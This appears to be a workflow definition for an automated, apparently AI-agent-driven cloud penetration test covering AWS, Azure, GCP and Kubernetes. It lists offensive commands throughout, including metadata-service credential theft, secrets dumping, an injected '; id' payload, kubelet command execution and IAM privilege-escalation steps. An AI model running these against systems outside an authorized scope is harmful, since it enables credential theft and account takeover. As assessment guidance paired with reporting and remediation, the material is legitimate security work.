---
name: W_HUNT_CLOUD
description: Cloud infrastructure security assessment for AWS, Azure, and GCP
trigger: Cloud environment, AWS account, Azure subscription, or GCP project detected
agents: [ReconAgent, CloudExploitationAgent, AWSAgent, AzureAgent, GCPAgent, KubernetesAgent, AuthAgent, SupplyChainAgent, SecretsExposureAgent, RCEAgent, SSRFAgent, IDORAgent, ValidatorAgent, ExploitChainAgent]
tools: [credential-vault]
skills_invoked: [CloudSecurity]
---

# W_HUNT_CLOUD — Cloud Security Assessment Workflow

## Overview

Comprehensive cloud infrastructure security assessment covering AWS, Azure, and GCP environments. This workflow systematically evaluates identity, storage, compute, network, serverless, database, and Kubernetes configurations to identify misconfigurations, privilege escalation paths, and data exposure risks.

---

## Phase 1: CLOUD RECONNAISSANCE

**Objective:** Enumerate cloud accounts, discover services, scan regions, and identify publicly exposed assets.

### Account Enumeration

```bash
# AWS — Identify account ID and aliases
aws sts get-caller-identity
aws iam list-account-aliases

# AWS — Enumerate all enabled regions
aws ec2 describe-regions --query "Regions[].RegionName" --output text

# Azure — List subscriptions and resource groups
az account list --output table
az group list --output table

# GCP — List projects and active services
gcloud projects list
gcloud services list --enabled --project <PROJECT_ID>
```

### Service Discovery

```bash
# ScoutSuite — Multi-cloud security auditing
scout aws --report-dir ./scoutsuite-aws
scout azure --report-dir ./scoutsuite-azure
scout gcp --report-dir ./scoutsuite-gcp

# Prowler — AWS security best practices
prowler aws --output-formats html json csv
prowler aws -c check11 -c check12  # Specific checks

# CloudMapper — AWS account visualization
cloudmapper collect --account <ACCOUNT_NAME>
cloudmapper report --account <ACCOUNT_NAME>
cloudmapper weboftrust --account <ACCOUNT_NAME>
```

### Public Asset Identification

```bash
# S3 bucket enumeration
s3scanner --bucket-file target-buckets.txt
aws s3 ls s3://<BUCKET> --no-sign-request
aws s3 ls s3://<BUCKET> --recursive --no-sign-request

# Azure Blob enumeration
az storage account list --query "[].{name:name,url:primaryEndpoints.blob}" --output table
curl -s "https://<ACCOUNT>.blob.core.windows.net/<CONTAINER>?restype=container&comp=list"

# GCS bucket enumeration
gsutil ls gs://<BUCKET>
gsutil ls -L gs://<BUCKET>

# EC2/VM metadata probing (from compromised instance)
curl -s http://169.254.169.254/latest/meta-data/
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### CloudFox Enumeration

```bash
# CloudFox — AWS enumeration
cloudfox aws --profile <PROFILE> inventory
cloudfox aws --profile <PROFILE> endpoints
cloudfox aws --profile <PROFILE> instances
cloudfox aws --profile <PROFILE> elastic-network-interfaces
cloudfox aws --profile <PROFILE> route53
```

---

## Phase 2: IDENTITY & ACCESS

**Objective:** Analyze IAM policies, enumerate roles, discover cross-account trust, and identify exposed service account keys.

### IAM Policy Analysis

```bash
# enumerate-iam — Brute-force IAM permissions
python3 enumerate-iam.py --access-key <KEY> --secret-key <SECRET> --region us-east-1

# AWS IAM enumeration
aws iam get-account-authorization-details > iam-full-dump.json
aws iam list-users --query "Users[].UserName" --output text
aws iam list-roles --query "Roles[].RoleName" --output text
aws iam list-policies --scope Local --query "Policies[].PolicyName"
aws iam list-attached-user-policies --user-name <USER>
aws iam list-user-policies --user-name <USER>
aws iam get-policy-version --policy-arn <ARN> --version-id v1

# Pacu — AWS exploitation framework
pacu
> import_keys <PROFILE>
> run iam__enum_permissions
> run iam__enum_users_roles_policies_groups
> run iam__bruteforce_permissions
```

### Role Assumption Chains

```bash
# List roles and their trust policies
aws iam list-roles --query "Roles[].{Name:RoleName,Trust:AssumeRolePolicyDocument}" > roles-trust.json

# Attempt role assumption
aws sts assume-role --role-arn arn:aws:iam::<ACCOUNT>:role/<ROLE> --role-session-name test

# Cross-account trust analysis
aws iam list-roles --query "Roles[?contains(to_string(AssumeRolePolicyDocument), 'arn:aws:iam::')]"

# Azure AD role enumeration
az role assignment list --all --output table
az ad app list --query "[].{name:displayName,appId:appId}" --output table

# GCP IAM analysis
gcloud projects get-iam-policy <PROJECT_ID> --format json
gcloud iam service-accounts list
gcloud iam service-accounts keys list --iam-account <SA_EMAIL>
```

### Conditional Policy Bypass

```bash
# Test for overly permissive conditions
aws iam simulate-principal-policy --policy-source-arn <USER_ARN> --action-names s3:GetObject --resource-arns "arn:aws:s3:::*/*"

# Check for wildcard resource permissions
cat iam-full-dump.json | jq '.Policies[].PolicyVersionList[].Document.Statement[] | select(.Resource == "*")'
```

---

## Phase 3: STORAGE SECURITY

**Objective:** Assess bucket policies, object ACLs, versioning, encryption, and pre-signed URL abuse vectors.

### S3/Blob/GCS Bucket Policies

```bash
# S3 bucket policy and ACL analysis
aws s3api get-bucket-policy --bucket <BUCKET>
aws s3api get-bucket-acl --bucket <BUCKET>
aws s3api get-bucket-policy-status --bucket <BUCKET>
aws s3api get-public-access-block --bucket <BUCKET>

# S3 object-level ACL checks
aws s3api get-object-acl --bucket <BUCKET> --key <OBJECT>

# Azure Blob access level
az storage container list --account-name <ACCOUNT> --query "[].{name:name,access:properties.publicAccess}"

# GCS bucket IAM and ACL
gsutil iam get gs://<BUCKET>
gsutil defacl get gs://<BUCKET>
```

### Versioning and Encryption

```bash
# Check versioning status
aws s3api get-bucket-versioning --bucket <BUCKET>
aws s3api list-object-versions --bucket <BUCKET> --prefix <PREFIX>

# Check encryption (SSE) configuration
aws s3api get-bucket-encryption --bucket <BUCKET>

# Look for unencrypted objects
aws s3api head-object --bucket <BUCKET> --key <KEY> --query "ServerSideEncryption"
```

### Pre-signed URL Abuse

```bash
# Generate pre-signed URL (testing if accessible without auth)
aws s3 presign s3://<BUCKET>/<KEY> --expires-in 3600

# Check cross-origin resource sharing
aws s3api get-bucket-cors --bucket <BUCKET>

# s3scanner comprehensive scan
s3scanner scan --bucket <BUCKET>
s3scanner dump --bucket <BUCKET>
```

---

## Phase 4: COMPUTE SECURITY

**Objective:** Exploit metadata services, analyze instance profiles, extract user-data secrets, and test container escape paths.

### Metadata Service Exploitation

```bash
# AWS IMDSv1 (no token required — vulnerable)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
curl -s http://169.254.169.254/latest/user-data

# AWS IMDSv2 (token required — check if enforced)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Azure IMDS
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# GCP metadata
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/attributes/"
```

### Instance Profile Analysis

```bash
# List EC2 instances and their IAM roles
aws ec2 describe-instances --query "Reservations[].Instances[].{ID:InstanceId,Role:IamInstanceProfile.Arn,State:State.Name}" --output table

# Check instance user-data for secrets
aws ec2 describe-instance-attribute --instance-id <ID> --attribute userData --query "UserData.Value" | base64 -d
```

### Container Escape (ECS/EKS/AKS/GKE)

```bash
# Check for privileged containers
kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged == true)'

# ECS task role credentials
curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# Container breakout checks
cat /proc/1/cgroup  # Check if in container
ls -la /var/run/docker.sock  # Docker socket access
mount | grep -i docker  # Mounted volumes
capsh --print  # Check capabilities

# Trivy container scanning
trivy image <IMAGE>:<TAG>
trivy image --severity HIGH,CRITICAL <IMAGE>:<TAG>
trivy fs /path/to/project
```

### Lambda Environment Variable Leakage

```bash
# List Lambda functions and their environment variables
aws lambda list-functions --query "Functions[].FunctionName"
aws lambda get-function-configuration --function-name <FUNC> --query "Environment.Variables"
aws lambda get-function --function-name <FUNC>  # Download code
```

---

## Phase 5: NETWORK SECURITY

**Objective:** Analyze security groups, VPC peering, transit gateways, and public exposure.

### Security Group Analysis

```bash
# Find overly permissive security groups
aws ec2 describe-security-groups --query "SecurityGroups[?IpPermissions[?IpRanges[?CidrIp=='0.0.0.0/0']]]" --output table

# List all inbound rules allowing 0.0.0.0/0
aws ec2 describe-security-groups --query "SecurityGroups[].IpPermissions[?IpRanges[?CidrIp=='0.0.0.0/0']].{Port:FromPort,Proto:IpProtocol}" --output table

# Azure NSG analysis
az network nsg list --query "[].{Name:name,Rules:securityRules[].{Dir:direction,Access:access,Src:sourceAddressPrefix,Port:destinationPortRange}}" --output json

# GCP firewall rules
gcloud compute firewall-rules list --format="table(name,network,direction,allowed[].map().firewall_rule().list():label=ALLOWED,sourceRanges)"
```

### VPC Peering and Transit Gateway

```bash
# VPC peering connections
aws ec2 describe-vpc-peering-connections --output table

# Transit gateway analysis
aws ec2 describe-transit-gateways
aws ec2 describe-transit-gateway-route-tables
aws ec2 describe-transit-gateway-attachments

# Check for public subnets
aws ec2 describe-route-tables --query "RouteTables[].Routes[?GatewayId && starts_with(GatewayId, 'igw-')]"

# Elastic IP and public IP enumeration
aws ec2 describe-addresses --output table
aws ec2 describe-network-interfaces --query "NetworkInterfaces[?Association.PublicIp]"
```

---

## Phase 6: SERVERLESS

**Objective:** Review serverless function code, test event injection, analyze dependencies, and extract secrets.

### Lambda/Cloud Functions Code Review

```bash
# Download and inspect Lambda code
aws lambda get-function --function-name <FUNC> --query "Code.Location" | xargs wget -O function.zip
unzip function.zip -d function_code/

# Search for secrets in function code
grep -rn "password\|secret\|key\|token\|api_key" function_code/
trufflehog filesystem function_code/

# Azure Functions enumeration
az functionapp list --query "[].{Name:name,URL:defaultHostName}" --output table
az functionapp function list --name <APP> --resource-group <RG>

# GCP Cloud Functions
gcloud functions list
gcloud functions describe <FUNC> --format json
```

### Event Injection Testing

```bash
# Lambda event injection via API Gateway
curl -X POST "https://<API_ID>.execute-api.<REGION>.amazonaws.com/<STAGE>/<PATH>" \
  -H "Content-Type: application/json" \
  -d '{"key": "{{injection_payload}}"}'

# Test for command injection in Lambda handlers
# Check if function processes user input unsafely
aws lambda invoke --function-name <FUNC> --payload '{"cmd": "; id"}' output.json

# SQS/SNS event injection
aws sqs send-message --queue-url <URL> --message-body '{"exploit": "test"}'
```

### Dependency Vulnerabilities

```bash
# Scan Lambda layers and dependencies
trivy fs function_code/ --severity HIGH,CRITICAL
pip-audit -r function_code/requirements.txt 2>/dev/null
npm audit --prefix function_code/ 2>/dev/null
```

---

## Phase 7: DATABASE SECURITY

**Objective:** Identify publicly accessible databases, exposed snapshots, and connection string leakage.

### RDS/Cloud SQL Public Access

```bash
# Find publicly accessible RDS instances
aws rds describe-db-instances --query "DBInstances[?PubliclyAccessible].[DBInstanceIdentifier,Endpoint.Address,Engine]" --output table

# Check DB security groups
aws rds describe-db-instances --query "DBInstances[].{DB:DBInstanceIdentifier,SGs:VpcSecurityGroups[].VpcSecurityGroupId}" --output table

# Azure SQL public access
az sql server list --query "[].{Name:name,Admin:administratorLogin,PublicAccess:publicNetworkAccess}" --output table

# GCP Cloud SQL
gcloud sql instances list
gcloud sql instances describe <INSTANCE> --format="value(settings.ipConfiguration.authorizedNetworks)"
```

### Snapshot Exposure

```bash
# Check for public RDS snapshots
aws rds describe-db-snapshots --snapshot-type public --query "DBSnapshots[].{ID:DBSnapshotIdentifier,Engine:Engine}" --output table

# Check own snapshots shared publicly
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <SNAP_ID>

# Copy and restore public snapshot for analysis
aws rds copy-db-snapshot --source-db-snapshot-identifier <ARN> --target-db-snapshot-identifier stolen-snap
```

### Connection String Leakage

```bash
# Search SSM Parameter Store for DB credentials
aws ssm describe-parameters --query "Parameters[?contains(Name, 'db') || contains(Name, 'rds') || contains(Name, 'password')]"
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# Secrets Manager
aws secretsmanager list-secrets --query "SecretList[].Name"
aws secretsmanager get-secret-value --secret-id <SECRET_NAME>

# CloudFox database enumeration
cloudfox aws --profile <PROFILE> databases
```

---

## Phase 8: KUBERNETES

**Objective:** Assess RBAC, pod security, service accounts, etcd, kubelet API, and container breakout paths.

### RBAC Analysis

```bash
# List cluster roles and bindings
kubectl get clusterroles -o json | jq '.items[] | select(.rules[].resources[] == "*")'
kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name == "cluster-admin")'

# Check current user permissions
kubectl auth can-i --list
kubectl auth can-i create pods --all-namespaces

# Enumerate service accounts
kubectl get serviceaccounts --all-namespaces
kubectl get secrets --all-namespaces -o json | jq '.items[] | select(.type == "kubernetes.io/service-account-token")'
```

### Pod Security

```bash
# Check for privileged pods
kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged == true) | .metadata.name'

# Check for hostPath mounts
kubectl get pods -A -o json | jq '.items[] | select(.spec.volumes[]?.hostPath) | {name: .metadata.name, hostPaths: [.spec.volumes[].hostPath.path]}'

# Check for pods with hostNetwork
kubectl get pods -A -o json | jq '.items[] | select(.spec.hostNetwork == true) | .metadata.name'

# Pod security admission (PSA) analysis
kubectl get ns -o json | jq '.items[].metadata.labels | with_entries(select(.key | startswith("pod-security")))'
```

### etcd and Kubelet Access

```bash
# Direct etcd access (if exposed)
etcdctl --endpoints=https://<ETCD_IP>:2379 get / --prefix --keys-only

# Kubelet API (if unauthenticated)
curl -sk https://<NODE_IP>:10250/pods
curl -sk https://<NODE_IP>:10250/run/<NAMESPACE>/<POD>/<CONTAINER> -d "cmd=id"

# Check for exposed Kubernetes dashboard
curl -sk https://<CLUSTER_IP>/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
```

---

## Phase 9: PRIVILEGE ESCALATION

**Objective:** Discover IAM privesc paths, role chaining, service-linked roles, and resource-based policy abuse.

### IAM Privilege Escalation (Rhino Security Research)

```bash
# Pacu privesc module
pacu
> run iam__privesc_scan

# Common AWS privesc vectors
# 1. iam:CreatePolicyVersion
aws iam create-policy-version --policy-arn <ARN> --policy-document file://admin-policy.json --set-as-default

# 2. iam:AttachUserPolicy
aws iam attach-user-policy --user-name <USER> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. iam:PassRole + lambda:CreateFunction
aws lambda create-function --function-name privesc --runtime python3.9 --role <ADMIN_ROLE_ARN> --handler index.handler --zip-file fileb://code.zip

# 4. iam:PassRole + ec2:RunInstances
aws ec2 run-instances --image-id <AMI> --instance-type t2.micro --iam-instance-profile Arn=<ADMIN_PROFILE_ARN>

# 5. sts:AssumeRole on overly trusting roles
aws sts assume-role --role-arn <ROLE_ARN> --role-session-name privesc

# 6. Lambda environment variable injection
aws lambda update-function-configuration --function-name <FUNC> --environment "Variables={AWS_ACCESS_KEY_ID=x,AWS_SECRET_ACCESS_KEY=y}"
```

### Role Chaining and Service-Linked Roles

```bash
# Identify role chains
aws iam list-roles --query "Roles[].{Role:RoleName,TrustedEntities:AssumeRolePolicyDocument.Statement[].Principal}" --output json

# Check for service-linked roles with excessive permissions
aws iam list-roles --query "Roles[?starts_with(Path, '/aws-service-role/')]"

# Resource-based policy abuse
aws s3api get-bucket-policy --bucket <BUCKET>  # Check for overly permissive principal
aws lambda get-policy --function-name <FUNC>  # Check who can invoke
aws sqs get-queue-attributes --queue-url <URL> --attribute-names Policy
aws sns get-topic-attributes --topic-arn <ARN>
```

### CloudFox Privilege Escalation

```bash
# CloudFox privesc enumeration
cloudfox aws --profile <PROFILE> permissions
cloudfox aws --profile <PROFILE> role-trusts
cloudfox aws --profile <PROFILE> access-keys
cloudfox aws --profile <PROFILE> iam-simulator
cloudfox aws --profile <PROFILE> pmapper  # If PMapper data available
```

---

## Phase 10: REPORTING

**Objective:** Compile findings, prioritize by risk, generate evidence, and produce actionable recommendations.

### Finding Classification

| Severity | Examples |
|----------|---------|
| Critical | Public S3 bucket with PII, admin credentials in metadata, unauthenticated etcd, public RDS with default creds |
| High | IAM privesc path, IMDSv1 enabled, overly permissive security groups (0.0.0.0/0 on sensitive ports) |
| Medium | Missing encryption at rest, overly broad IAM policies, public snapshots |
| Low | Missing tagging, non-enforced MFA, informational findings |

### Evidence Collection

```bash
# Screenshot and save all findings
mkdir -p evidence/{recon,iam,storage,compute,network,serverless,database,k8s,privesc}

# Export Prowler results
prowler aws --output-formats json html csv -o evidence/

# Export ScoutSuite report
cp -r scoutsuite-aws/ evidence/scoutsuite/

# Generate CloudMapper report
cloudmapper report --account <ACCOUNT> --output evidence/cloudmapper/
```

### Report Template

```markdown
# Cloud Security Assessment Report

## Executive Summary
- Scope: [AWS Account / Azure Subscription / GCP Project]
- Assessment Period: [Dates]
- Critical Findings: [Count]
- High Findings: [Count]

## Finding Detail
### [FINDING-001] [Title]
- **Severity:** Critical/High/Medium/Low
- **Service:** [AWS Service]
- **Resource:** [ARN/ID]
- **Description:** [What was found]
- **Impact:** [Business impact]
- **Evidence:** [Screenshots, commands, output]
- **Remediation:** [Specific steps]
- **References:** [CIS Benchmark, AWS Best Practices]
```

---

## Decision Gates

| Gate | Condition | Action |
|------|-----------|--------|
| Post-Recon | No cloud assets found | STOP — not a cloud target |
| Post-IAM | Credentials expired or revoked | Re-authenticate or pivot |
| Post-Storage | No public buckets | Skip storage deep-dive |
| Post-Compute | No running instances | Focus on serverless/managed |
| Post-K8s | No K8s clusters found | Skip Phase 8 |
| Critical Found | RCE or data exposure confirmed | Pause, document, notify |

## Tool Reference

| Tool | Purpose | Install |
|------|---------|---------|
| Pacu | AWS exploitation framework | `pip install pacu` |
| ScoutSuite | Multi-cloud security auditing | `pip install scoutsuite` |
| Prowler | AWS/Azure/GCP security checks | `pip install prowler` |
| CloudMapper | AWS visualization and auditing | `pip install cloudmapper` |
| enumerate-iam | IAM permission brute-force | `git clone https://github.com/andresriancho/enumerate-iam` |
| s3scanner | S3 bucket scanner | `pip install s3scanner` |
| CloudFox | AWS situational awareness | `go install github.com/BishopFox/cloudfox@latest` |
| Trivy | Container/filesystem scanner | `brew install trivy` |
